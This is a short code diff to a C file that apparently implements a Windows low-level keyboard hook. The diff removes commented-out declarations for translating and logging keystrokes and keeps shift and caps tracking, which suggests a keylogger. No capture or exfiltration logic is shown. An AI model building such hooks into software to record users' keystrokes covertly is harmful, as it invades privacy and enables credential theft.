@@ -6,10 +6,6 @@
 #include <time.h>
 #include "keys_handler.h"
 
-//char *translate(int vk, int up);
-//void log(char *str);
-//extern FILE *fd;
-
 int shift = 0, caps = 0;
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
